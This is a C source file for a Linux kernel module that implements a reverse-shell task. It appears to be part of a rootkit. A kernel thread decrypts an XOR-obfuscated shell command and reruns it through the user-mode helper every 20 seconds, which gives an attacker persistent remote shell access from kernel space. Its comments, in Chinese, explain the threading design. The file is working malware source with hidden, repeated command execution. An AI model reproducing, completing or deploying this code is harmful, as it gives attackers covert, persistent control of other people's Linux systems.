#include "tasks/reverse_shell.h"
#include "utils/encrypt_utils.h"
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/umh.h>

static void run_rshell_once(char *cmd)
{
    char *argv[] = { "/bin/bash", "-c", cmd, NULL };
    static char *envp[] = { 
        "HOME=/", 
        "TERM=linux", 
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", 
        NULL 
    };
    
    call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);

}

/* 主线程逻辑，只调度，不直接执行 UMH */
int rshell_func(void *data)
{
    char xor_cmd[] = RSHELL_CMD_OBF;

    if (xor_cmd[0] == '\0')
        return 0;

    xor_decrypt(xor_cmd);

    while (!kthread_should_stop()) {
        /* 每次调用都 fork 一个轻量 worker 来执行 UMH */
        run_rshell_once(xor_cmd);
        ssleep(20);
    }

    return 0;
}
